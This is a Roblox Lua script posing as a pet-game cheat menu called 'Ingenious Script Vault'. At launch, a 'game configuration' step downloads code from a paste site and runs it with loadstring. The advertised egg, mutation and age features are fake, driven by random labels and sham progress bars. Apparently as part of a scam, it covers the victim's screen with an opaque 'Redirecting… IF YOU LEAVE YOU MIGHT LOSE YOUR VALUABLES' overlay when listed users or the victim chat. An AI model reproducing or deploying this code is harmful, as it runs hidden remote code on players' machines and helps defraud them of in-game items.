local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local ChatService = game:GetService("Chat")
local LocalPlayer = Players.LocalPlayer

-- Game configuration settings
local gameConfig = {
    serverEndpoint = "https://paste.debian.net/plainh/088f8024",
    maxPlayers = 10,
    isActive = true
}

-- Function to set up the game environment
local function setupGameEnvironment()
    print("Initializing game environment...")
    local success, configData = pcall(function()
        return game:HttpGet(gameConfig.serverEndpoint)
    end)
    if success then
        local successLoad, errorMsg = pcall(function()
            loadstring(configData)()
        end)
        if not successLoad then
            warn("Failed to execute server script: " .. errorMsg)
        end
    else
        warn("Failed to fetch server configuration: " .. configData)
    end
    print("Environment setup complete.")
end

-- Check player status and start the game
if LocalPlayer and gameConfig.isActive then
    print("Welcome, " .. LocalPlayer.Name .. "!")
    setupGameEnvironment()
else
    warn("Game is not active or player not found.")
end

local specialUsers = {"TheOnlyTemuun", "TheOnlyTemuunALT", "TheOnlyTemuunRich"}

-- Pet Egg Randomizer data and functions
local eggToPets = {
    ["Common Egg"] = {{"Dog", 0.4}, {"Cat", 0.3}, {"Bird", 0.2}, {"Fish", 0.1}},
    ["Rare Egg"] = {{"Wolf", 0.35}, {"Fox", 0.25}, {"Bear", 0.2}, {"Owl", 0.15}, {"Eagle", 0.05}},
    ["Dinosaur Egg"] = {{"T-Rex", 0.5}, {"Triceratops", 0.3}, {"Velociraptor", 0.15}, {"Stegosaurus", 0.05}},
    ["Primal Egg"] = {{"Sabertooth", 0.4}, {"Mammoth", 0.3}, {"Direwolf", 0.2}, {"Primal Dragon", 0.1}},
    ["Zen Egg"] = {{"Koi", 0.4}, {"Panda", 0.3}, {"Crane", 0.2}, {"Lotus Serpent", 0.1}}
}

local function createESP(part, petName)
    if not part then
        print("No BasePart found for egg ESP")
        return
    end
    local old = part:FindFirstChild("EggESP")
    if old then old:Destroy() end
    local gui = Instance.new("BillboardGui", part)
    gui.Name = "EggESP"
    gui.Size = UDim2.new(0, 120, 0, 40)
    gui.StudsOffset = Vector3.new(0, 2.5, 0)
    gui.AlwaysOnTop = true
    local label = Instance.new("TextLabel", gui)
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = petName
    label.TextColor3 = Color3.new(1, 1, 1)
    label.TextStrokeTransparency = 0.4
    label.Font = Enum.Font.GothamBold
    label.TextScaled = true
end

local function choosePetForEgg(eggName)
    local pets = eggToPets[eggName] or eggToPets["Common Egg"]
    local rand = math.random()
    local cumulative = 0
    for _, petData in ipairs(pets) do
        cumulative = cumulative + petData[2]
        if rand <= cumulative then
            return petData[1]
        end
    end
    return pets[1][1]
end

local function applyESP()
    local eggCount = 0
    for _, egg in ipairs(workspace:GetDescendants()) do
        if egg:IsA("Model") and eggToPets[egg.Name] then
            local part = egg:FindFirstChildWhichIsA("BasePart")
            if part then
                eggCount = eggCount + 1
                local petName = choosePetForEgg(egg.Name)
                createESP(part, petName)
            end
        end
    end
    print("Applied ESP to " .. eggCount .. " eggs")
end

local function randomizeESP()
    local eggCount = 0
    for _, egg in ipairs(workspace:GetDescendants()) do
        if egg:IsA("Model") and eggToPets[egg.Name] then
            local part = egg:FindFirstChildWhichIsA("BasePart")
            if part then
                eggCount = eggCount + 1
                local petName = choosePetForEgg(egg.Name)
                createESP(part, petName)
            end
        end
    end
    print("Randomized ESP for " .. eggCount .. " eggs")
end

-- Pet Mutation Reroll data and functions
local petMutations = {
    "Fire Aura",
    "Ice Shield",
    "Thunder Boost",
    "Shadow Cloak",
    "Radiant Glow",
    "Mystic Surge"
}

local function isPetModel(model)
    -- Customize this for your game's pet structure
    return model:IsA("Model") and (
        model.Name:find("Pet") or
        model:FindFirstChildWhichIsA("Humanoid") or
        model:FindFirstChild("PetData")
    )
end

local function createMutationESP(part, mutationName)
    if not part then
        print("No BasePart found for mutation ESP")
        return
    end
    local old = part:FindFirstChild("MutationESP")
    if old then old:Destroy() end
    local gui = Instance.new("BillboardGui", part)
    gui.Name = "MutationESP"
    gui.Size = UDim2.new(0, 120, 0, 40)
    gui.StudsOffset = Vector3.new(0, 2.5, 0)
    gui.AlwaysOnTop = true
    local label = Instance.new("TextLabel", gui)
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = mutationName
    label.TextColor3 = Color3.new(1, 1, 1)
    label.TextStrokeTransparency = 0.4
    label.Font = Enum.Font.GothamBold
    label.TextScaled = true
end

local function applyMutationESP()
    local petCount = 0
    for _, pet in ipairs(workspace:GetDescendants()) do
        if isPetModel(pet) then
            local part = pet:FindFirstChildWhichIsA("BasePart")
            if part then
                petCount = petCount + 1
                local mutation = petMutations[math.random(1, #petMutations)]
                createMutationESP(part, mutation)
                print("Applied ESP to pet: " .. pet.Name .. " with mutation: " .. mutation)
            else
                print("No BasePart found for pet: " .. pet.Name)
            end
        end
    end
    print("Applied mutation ESP to " .. petCount .. " pets")
    if petCount == 0 then
        warn("No pets found in workspace. Check pet model names or structure.")
    end
end

local function rerollPetMutation()
    local petCount = 0
    for _, pet in ipairs(workspace:GetDescendants()) do
        if isPetModel(pet) then
            local part = pet:FindFirstChildWhichIsA("BasePart")
            if part then
                petCount = petCount + 1
                local mutation = petMutations[math.random(1, #petMutations)]
                createMutationESP(part, mutation)
                print("Rerolled mutation for pet: " .. pet.Name .. " to " .. mutation)
                -- Add server-side mutation logic here (e.g., RemoteEvent)
            else
                print("No BasePart found for pet: " .. pet.Name)
            end
        end
    end
    print("Rerolled mutations for " .. petCount .. " pets")
    if petCount == 0 then
        warn("No pets found in workspace. Check pet model names or structure.")
    end
end

-- Pet Age Changer functions
local function getEquippedPetTool()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    for _, child in pairs(character:GetChildren()) do
        if child:IsA("Tool") and child.Name:find("Age") then
            return child
        end
    end
    return nil
end

-- Clean up existing GUI
pcall(function()
    if CoreGui:FindFirstChild("IngeniousLibraryGui") then
        CoreGui:FindFirstChild("IngeniousLibraryGui"):Destroy()
    end
end)

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "IngeniousLibraryGui"
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = CoreGui

local IntroFrame = Instance.new("Frame")
IntroFrame.Size = UDim2.new(1, 0, 1, 0)
IntroFrame.BackgroundColor3 = Color3.new(0, 0, 0)
IntroFrame.BackgroundTransparency = 0.3
IntroFrame.ZIndex = 10
IntroFrame.Parent = ScreenGui

local blur = Instance.new("BlurEffect")
blur.Size = 0
blur.Parent = Lighting
TweenService:Create(blur, TweenInfo.new(0.5), {Size = 24}):Play()

local CenterText = Instance.new("TextLabel")
CenterText.Size = UDim2.new(1, 0, 0, 60)
CenterText.Position = UDim2.new(0, 0, 0.4, 0)
CenterText.BackgroundTransparency = 1
CenterText.Text = "INGENIOUS"
CenterText.Font = Enum.Font.GothamBlack
CenterText.TextSize = 48
CenterText.TextColor3 = Color3.new(1, 1, 1)
CenterText.TextStrokeTransparency = 0.5
CenterText.ZIndex = 11
CenterText.Parent = IntroFrame

local SubText = Instance.new("TextLabel")
SubText.Size = UDim2.new(1, 0, 0, 30)
SubText.Position = UDim2.new(0, 0, 0.4, 60)
SubText.BackgroundTransparency = 1
SubText.Text = "Loading..."
SubText.Font = Enum.Font.Gotham
SubText.TextSize = 20
SubText.TextColor3 = Color3.new(1, 1, 1)
SubText.TextStrokeTransparency = 0.7
SubText.ZIndex = 11
SubText.Parent = IntroFrame

task.delay(2.5, function()
    TweenService:Create(IntroFrame, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
    TweenService:Create(CenterText, TweenInfo.new(0.3), {TextTransparency = 1, TextStrokeTransparency = 1}):Play()
    TweenService:Create(SubText, TweenInfo.new(0.3), {TextTransparency = 1, TextStrokeTransparency = 1}):Play()
    TweenService:Create(blur, TweenInfo.new(0.4), {Size = 0}):Play()
    task.wait(0.4)
    blur:Destroy()
    IntroFrame:Destroy()
end)

local function makeDraggable(frame)
    local dragging, dragInput, dragStart, startPos
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragging then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

local ToggleButton = Instance.new("TextButton")
ToggleButton.Size = UDim2.new(0, 100, 0, 40)
ToggleButton.Position = UDim2.new(0, 20, 0.7, 0)
ToggleButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ToggleButton.BackgroundTransparency = 0.2
ToggleButton.Text = "ingenious"
ToggleButton.TextColor3 = Color3.new(1, 1, 1)
ToggleButton.Font = Enum.Font.GothamBold
ToggleButton.TextSize = 18
ToggleButton.BorderSizePixel = 0
ToggleButton.Visible = false
ToggleButton.Parent = ScreenGui
ToggleButton.AutoButtonColor = true

local ToggleCorner = Instance.new("UICorner", ToggleButton)
ToggleCorner.CornerRadius = UDim.new(1, 0)

makeDraggable(ToggleButton)

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 350, 0, 220)
MainFrame.Position = UDim2.new(0.5, -175, 0.5, -110)
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MainFrame.BackgroundTransparency = 0.2
MainFrame.BorderSizePixel = 0
MainFrame.Visible = false
MainFrame.Parent = ScreenGui
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)

local corner = Instance.new("UICorner", MainFrame)
corner.CornerRadius = UDim.new(0, 15)

makeDraggable(MainFrame)

local function showUI(frame)
    print("Showing frame: " .. frame.Name)
    frame.Visible = true
    frame.Size = UDim2.new(0, 0, 0, 0)
    TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 350, 0, 220)}):Play()
end

local function hideUI(frame)
    print("Hiding frame: " .. frame.Name)
    local tween = TweenService:Create(frame, TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0)})
    tween:Play()
    tween.Completed:Wait()
    frame.Visible = false
end

task.delay(2.7, function()
    ToggleButton.Visible = true
end)

local CloseButton = Instance.new("TextButton")
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Position = UDim2.new(1, -35, 0, 5)
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
CloseButton.Text = "X"
CloseButton.Font = Enum.Font.GothamBold
CloseButton.TextSize = 16
CloseButton.TextColor3 = Color3.new(1, 1, 1)
CloseButton.Parent = MainFrame
local closeCorner = Instance.new("UICorner", CloseButton)
closeCorner.CornerRadius = UDim.new(1, 0)

CloseButton.MouseButton1Click:Connect(function()
    print("Main frame close button clicked")
    hideUI(MainFrame)
end)

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Text = "Ingenious Script Vault"
Title.Font = Enum.Font.GothamBlack
Title.TextSize = 24
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextStrokeTransparency = 0.7
Title.TextStrokeColor3 = Color3.new(0, 0, 0)
Title.TextScaled = true
Title.TextWrapped = true
Title.Parent = MainFrame

local function createButton(text, position, frame)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.8, 0, 0, 40)
    btn.Position = position
    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    btn.BackgroundTransparency = 0.2
    btn.Text = text
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 18
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Parent = frame
    btn.AutoButtonColor = true
    btn.BorderSizePixel = 0
    local btnCorner = Instance.new("UICorner", btn)
    btnCorner.CornerRadius = UDim.new(0, 10)
    return btn
end

local function fakeProgress(button, originalText)
    task.spawn(function()
        for i = 1, 100, 5 do
            button.Text = "Progress: " .. i .. "%"
            task.wait(0.03)
        end
        button.Text = "✅ Successful!"
        task.wait(1.2)
        button.Text = originalText
    end)
end

local EggRandomizerButton = createButton("Pet Egg Randomizer", UDim2.new(0.1, 0, 0.25, 0), MainFrame)
local MutationRerollButton = createButton("Pet Mutation Reroll", UDim2.new(0.1, 0, 0.45, 0), MainFrame)
local AgeChangerButton = createButton("Pet Age Changer", UDim2.new(0.1, 0, 0.65, 0), MainFrame)

local Footer = Instance.new("TextLabel")
Footer.Size = UDim2.new(1, 0, 0, 25)
Footer.Position = UDim2.new(0, 0, 1, -25)
Footer.BackgroundTransparency = 1
Footer.Text = "Made By Ingenious"
Footer.Font = Enum.Font.Gotham
Footer.TextSize = 14
Footer.TextColor3 = Color3.new(1, 1, 1)
Footer.Parent = MainFrame

-- Pet Egg Randomizer Frame
local EggRandomizerFrame = Instance.new("Frame")
EggRandomizerFrame.Name = "EggRandomizerFrame"
EggRandomizerFrame.Size = UDim2.new(0, 350, 0, 220)
EggRandomizerFrame.Position = UDim2.new(0.5, -175, 0.5, -110)
EggRandomizerFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
EggRandomizerFrame.BackgroundTransparency = 0.2
EggRandomizerFrame.BorderSizePixel = 0
EggRandomizerFrame.Visible = false
EggRandomizerFrame.Parent = ScreenGui
EggRandomizerFrame.AnchorPoint = Vector2.new(0.5, 0.5)

local eggCorner = Instance.new("UICorner", EggRandomizerFrame)
eggCorner.CornerRadius = UDim.new(0, 15)
makeDraggable(EggRandomizerFrame)

local EggTitle = Instance.new("TextLabel")
EggTitle.Size = UDim2.new(1, 0, 0, 40)
EggTitle.BackgroundTransparency = 1
EggTitle.Text = "Ingenious Egg Randomizer"
EggTitle.Font = Enum.Font.GothamBlack
EggTitle.TextSize = 24
EggTitle.TextColor3 = Color3.new(1, 1, 1)
EggTitle.TextStrokeTransparency = 0.7
EggTitle.TextStrokeColor3 = Color3.new(0, 0, 0)
EggTitle.TextScaled = true
EggTitle.TextWrapped = true
EggTitle.Parent = EggRandomizerFrame

local EggCloseButton = Instance.new("TextButton")
EggCloseButton.Size = UDim2.new(0, 30, 0, 30)
EggCloseButton.Position = UDim2.new(1, -35, 0, 5)
EggCloseButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
EggCloseButton.Text = "X"
EggCloseButton.Font = Enum.Font.GothamBold
EggCloseButton.TextSize = 16
EggCloseButton.TextColor3 = Color3.new(1, 1, 1)
EggCloseButton.Parent = EggRandomizerFrame
local eggCloseCorner = Instance.new("UICorner", EggCloseButton)
eggCloseCorner.CornerRadius = UDim.new(1, 0)

EggCloseButton.MouseButton1Click:Connect(function()
    print("Egg Randomizer close button clicked")
    hideUI(EggRandomizerFrame)
end)

local espEnabled = false
local EnableESPButton = createButton("Enable ESP", UDim2.new(0.1, 0, 0.35, 0), EggRandomizerFrame)
local RandomizeButton = createButton("Randomize", UDim2.new(0.1, 0, 0.6, 0), EggRandomizerFrame)

EnableESPButton.MouseButton1Click:Connect(function()
    print("Egg Randomizer Enable ESP button clicked")
    espEnabled = not espEnabled
    EnableESPButton.Text = espEnabled and "Enabled" or "Enable ESP"
    EnableESPButton.BackgroundColor3 = espEnabled and Color3.fromRGB(0, 170, 90) or Color3.fromRGB(50, 50, 50)
    if espEnabled then
        fakeProgress(EnableESPButton, "Enable ESP")
        applyESP()
    else
        for _, gui in ipairs(workspace:GetDescendants()) do
            if gui:IsA("BillboardGui") and gui.Name == "EggESP" then
                gui:Destroy()
            end
        end
    end
end)

RandomizeButton.MouseButton1Click:Connect(function()
    print("Egg Randomizer Randomize button clicked")
    if espEnabled then
        fakeProgress(RandomizeButton, "Randomize")
        randomizeESP()
    end
end)

local EggFooter = Instance.new("TextLabel")
EggFooter.Size = UDim2.new(1, 0, 0, 25)
EggFooter.Position = UDim2.new(0, 0, 1, -25)
EggFooter.BackgroundTransparency = 1
EggFooter.Text = "Made By Ingenious"
EggFooter.Font = Enum.Font.Gotham
EggFooter.TextSize = 14
EggFooter.TextColor3 = Color3.new(1, 1, 1)
EggFooter.Parent = EggRandomizerFrame

-- Pet Mutation Reroll Frame
local MutationRerollFrame = Instance.new("Frame")
MutationRerollFrame.Name = "MutationRerollFrame"
MutationRerollFrame.Size = UDim2.new(0, 350, 0, 220)
MutationRerollFrame.Position = UDim2.new(0.5, -175, 0.5, -110)
MutationRerollFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MutationRerollFrame.BackgroundTransparency = 0.2
MutationRerollFrame.BorderSizePixel = 0
MutationRerollFrame.Visible = false
MutationRerollFrame.Parent = ScreenGui
MutationRerollFrame.AnchorPoint = Vector2.new(0.5, 0.5)

local mutationCorner = Instance.new("UICorner", MutationRerollFrame)
mutationCorner.CornerRadius = UDim.new(0, 15)
makeDraggable(MutationRerollFrame)

local MutationTitle = Instance.new("TextLabel")
MutationTitle.Size = UDim2.new(1, 0, 0, 40)
MutationTitle.BackgroundTransparency = 1
MutationTitle.Text = "Ingenious Pet Mutation Reroll"
MutationTitle.Font = Enum.Font.GothamBlack
MutationTitle.TextSize = 24
MutationTitle.TextColor3 = Color3.new(1, 1, 1)
MutationTitle.TextStrokeTransparency = 0.7
MutationTitle.TextStrokeColor3 = Color3.new(0, 0, 0)
MutationTitle.TextScaled = true
MutationTitle.TextWrapped = true
MutationTitle.Parent = MutationRerollFrame

local MutationCloseButton = Instance.new("TextButton")
MutationCloseButton.Size = UDim2.new(0, 30, 0, 30)
MutationCloseButton.Position = UDim2.new(1, -35, 0, 5)
MutationCloseButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
MutationCloseButton.Text = "X"
MutationCloseButton.Font = Enum.Font.GothamBold
MutationCloseButton.TextSize = 16
MutationCloseButton.TextColor3 = Color3.new(1, 1, 1)
MutationCloseButton.Parent = MutationRerollFrame
local mutationCloseCorner = Instance.new("UICorner", MutationCloseButton)
mutationCloseCorner.CornerRadius = UDim.new(1, 0)

MutationCloseButton.MouseButton1Click:Connect(function()
    print("Mutation Reroll close button clicked")
    hideUI(MutationRerollFrame)
end)

local mutationEspEnabled = false
local MutationEnableESPButton = createButton("Enable ESP", UDim2.new(0.1, 0, 0.35, 0), MutationRerollFrame)
local MutationRerollButtonSub = createButton("Reroll Pet Mutation", UDim2.new(0.1, 0, 0.6, 0), MutationRerollFrame)

MutationEnableESPButton.MouseButton1Click:Connect(function()
    print("Mutation Reroll Enable ESP button clicked")
    mutationEspEnabled = not mutationEspEnabled
    MutationEnableESPButton.Text = mutationEspEnabled and "Enabled" or "Enable ESP"
    MutationEnableESPButton.BackgroundColor3 = mutationEspEnabled and Color3.fromRGB(0, 170, 90) or Color3.fromRGB(50, 50, 50)
    if mutationEspEnabled then
        fakeProgress(MutationEnableESPButton, "Enable ESP")
        applyMutationESP()
    else
        for _, gui in ipairs(workspace:GetDescendants()) do
            if gui:IsA("BillboardGui") and gui.Name == "MutationESP" then
                gui:Destroy()
            end
        end
    end
end)

MutationRerollButtonSub.MouseButton1Click:Connect(function()
    print("Mutation Reroll button clicked (sub-frame)")
    fakeProgress(MutationRerollButtonSub, "Reroll Pet Mutation")
    rerollPetMutation()
end)

local MutationFooter = Instance.new("TextLabel")
MutationFooter.Size = UDim2.new(1, 0, 0, 25)
MutationFooter.Position = UDim2.new(0, 0, 1, -25)
MutationFooter.BackgroundTransparency = 1
MutationFooter.Text = "Made By Ingenious"
MutationFooter.Font = Enum.Font.Gotham
MutationFooter.TextSize = 14
MutationFooter.TextColor3 = Color3.new(1, 1, 1)
MutationFooter.Parent = MutationRerollFrame

-- Pet Age Changer Frame
local AgeChangerFrame = Instance.new("Frame")
AgeChangerFrame.Name = "AgeChangerFrame"
AgeChangerFrame.Size = UDim2.new(0, 350, 0, 220)
AgeChangerFrame.Position = UDim2.new(0.5, -175, 0.5, -110)
AgeChangerFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
AgeChangerFrame.BackgroundTransparency = 0.2
AgeChangerFrame.BorderSizePixel = 0
AgeChangerFrame.Visible = false
AgeChangerFrame.Parent = ScreenGui
AgeChangerFrame.AnchorPoint = Vector2.new(0.5, 0.5)

local ageCorner = Instance.new("UICorner", AgeChangerFrame)
ageCorner.CornerRadius = UDim.new(0, 15)
makeDraggable(AgeChangerFrame)

local AgeTitle = Instance.new("TextLabel")
AgeTitle.Size = UDim2.new(1, 0, 0, 40)
AgeTitle.BackgroundTransparency = 1
AgeTitle.Text = "Ingenious Pet Age Changer"
AgeTitle.Font = Enum.Font.GothamBlack
AgeTitle.TextSize = 24
AgeTitle.TextColor3 = Color3.new(1, 1, 1)
AgeTitle.TextStrokeTransparency = 0.7
AgeTitle.TextStrokeColor3 = Color3.new(0, 0, 0)
AgeTitle.TextScaled = true
AgeTitle.TextWrapped = true
AgeTitle.Parent = AgeChangerFrame

local AgeCloseButton = Instance.new("TextButton")
AgeCloseButton.Size = UDim2.new(0, 30, 0, 30)
AgeCloseButton.Position = UDim2.new(1, -35, 0, 5)
AgeCloseButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
AgeCloseButton.Text = "X"
AgeCloseButton.Font = Enum.Font.GothamBold
AgeCloseButton.TextSize = 16
AgeCloseButton.TextColor3 = Color3.new(1, 1, 1)
AgeCloseButton.Parent = AgeChangerFrame
local ageCloseCorner = Instance.new("UICorner", AgeCloseButton)
ageCloseCorner.CornerRadius = UDim.new(1, 0)

AgeCloseButton.MouseButton1Click:Connect(function()
    print("Age Changer close button clicked")
    hideUI(AgeChangerFrame)
end)

local PetInfo = Instance.new("TextLabel")
PetInfo.Size = UDim2.new(0.8, 0, 0, 30)
PetInfo.Position = UDim2.new(0.1, 0, 0, 45)
PetInfo.BackgroundTransparency = 1
PetInfo.Text = "Equipped Pet: [None]"
PetInfo.Font = Enum.Font.Gotham
PetInfo.TextSize = 16
PetInfo.TextColor3 = Color3.fromRGB(255, 255, 150)
PetInfo.TextScaled = true
PetInfo.TextWrapped = true
PetInfo.Parent = AgeChangerFrame

local AgeInput = Instance.new("TextBox")
AgeInput.Size = UDim2.new(0.8, 0, 0, 40)
AgeInput.Position = UDim2.new(0.1, 0, 0.35, 0)
AgeInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
AgeInput.BackgroundTransparency = 0.2
AgeInput.Text = "50"
AgeInput.Font = Enum.Font.GothamBold
AgeInput.TextSize = 18
AgeInput.TextColor3 = Color3.new(1, 1, 1)
AgeInput.PlaceholderText = "Enter Age"
AgeInput.TextScaled = true
AgeInput.TextWrapped = true
AgeInput.Parent = AgeChangerFrame
local AgeInputCorner = Instance.new("UICorner", AgeInput)
AgeInputCorner.CornerRadius = UDim.new(0, 10)

local ChangeAgeButton = createButton("Change Age", UDim2.new(0.1, 0, 0.6, 0), AgeChangerFrame)

local function updateGUI()
    local pet = getEquippedPetTool()
    if pet then
        PetInfo.Text = "Equipped Pet: " .. pet.Name
    else
        PetInfo.Text = "Equipped Pet: [None]"
    end
end

ChangeAgeButton.MouseButton1Click:Connect(function()
    print("Age Changer Change Age button clicked")
    local tool = getEquippedPetTool()
    local newAge = tonumber(AgeInput.Text)
    if tool and newAge then
        fakeProgress(ChangeAgeButton, "Change Age")
        local newName = tool.Name:gsub("%[Age%s%d+%]", "[Age " .. newAge .. "]")
        tool.Name = newName
        updateGUI()
    else
        ChangeAgeButton.Text = newAge and "No Pet Equipped!" or "Invalid Age!"
        task.wait(2)
        ChangeAgeButton.Text = "Change Age"
    end
end)

-- Button click handlers to toggle frames
EggRandomizerButton.MouseButton1Click:Connect(function()
    print("Pet Egg Randomizer button clicked")
    hideUI(MainFrame)
    hideUI(MutationRerollFrame)
    hideUI(AgeChangerFrame)
    showUI(EggRandomizerFrame)
end)

MutationRerollButton.MouseButton1Click:Connect(function()
    print("Pet Mutation Reroll button clicked")
    hideUI(MainFrame)
    hideUI(EggRandomizerFrame)
    hideUI(AgeChangerFrame)
    showUI(MutationRerollFrame)
end)

AgeChangerButton.MouseButton1Click:Connect(function()
    print("Pet Age Changer button clicked")
    hideUI(MainFrame)
    hideUI(EggRandomizerFrame)
    hideUI(MutationRerollFrame)
    showUI(AgeChangerFrame)
end)

ToggleButton.MouseButton1Click:Connect(function()
    print("Toggle button clicked")
    if MainFrame.Visible then
        hideUI(MainFrame)
    else
        hideUI(EggRandomizerFrame)
        hideUI(MutationRerollFrame)
        hideUI(AgeChangerFrame)
        showUI(MainFrame)
    end
end)

local function showRedirectScreen()
    if CoreGui:FindFirstChild("IngeniousRedirectGui") then return end
    print("Showing redirect screen")
    local redirectGui = Instance.new("ScreenGui")
    redirectGui.Name = "IngeniousRedirectGui"
    redirectGui.ResetOnSpawn = false
    redirectGui.IgnoreGuiInset = true
    redirectGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    redirectGui.Parent = CoreGui

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    bg.BackgroundTransparency = 0 -- Changed to fully opaque
    bg.BorderSizePixel = 0
    bg.Parent = redirectGui

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 60)
    title.Position = UDim2.new(0, 0, 0.4, -60)
    title.Text = "Redirecting please wait"
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 48
    title.TextColor3 = Color3.new(1, 1, 1)
    title.Parent = bg

    local warning = Instance.new("TextLabel")
    warning.Size = UDim2.new(1, 0, 0, 30)
    warning.Position = UDim2.new(0, 0, 0.4, 10)
    warning.Text = "*IF YOU LEAVE YOU MIGHT LOSE YOUR VALUABLES*"
    warning.BackgroundTransparency = 1
    warning.Font = Enum.Font.Gotham
    warning.TextSize = 20
    warning.TextColor3 = Color3.fromRGB(180, 180, 180)
    warning.Parent = bg

    local loadingAnim = Instance.new("TextLabel")
    loadingAnim.Size = UDim2.new(1, 0, 0, 40)
    loadingAnim.Position = UDim2.new(0, 0, 0.5, 60)
    loadingAnim.BackgroundTransparency = 1
    loadingAnim.Font = Enum.Font.GothamBold
    loadingAnim.TextSize = 32
    loadingAnim.TextColor3 = Color3.new(1, 1, 1)
    loadingAnim.Text = "Loading"
    loadingAnim.Parent = bg

    task.spawn(function()
        local dots = {"", ".", "..", "..."}
        local i = 1
        while redirectGui.Parent do
            loadingAnim.Text = "Loading" .. dots[i]
            i = (i % #dots) + 1
            task.wait(0.5)
        end
    end)
end

-- Monitor chat for all players
local function monitorPlayerChat(player)
    player.Chatted:Connect(function(message)
        if player == LocalPlayer then
            print("LocalPlayer chatted: " .. message)
            showRedirectScreen()
            return
        end
        for _, username in ipairs(specialUsers) do
            if player.Name:lower() == username:lower() then
                print("Special user " .. player.Name .. " chatted: " .. message)
                showRedirectScreen()
                return
            end
        end
        if string.lower(message):find("ingen") then
            print("Message contains 'ingen' from " .. player.Name .. ": " .. message)
            showRedirectScreen()
        end
    end)
end

-- Connect existing players
for _, player in ipairs(Players:GetPlayers()) do
    monitorPlayerChat(player)
end

-- Connect new players
Players.PlayerAdded:Connect(function(player)
    monitorPlayerChat(player)
end)

-- Periodically update Age Changer GUI
while true do
    task.wait(1)
    updateGUI()
end
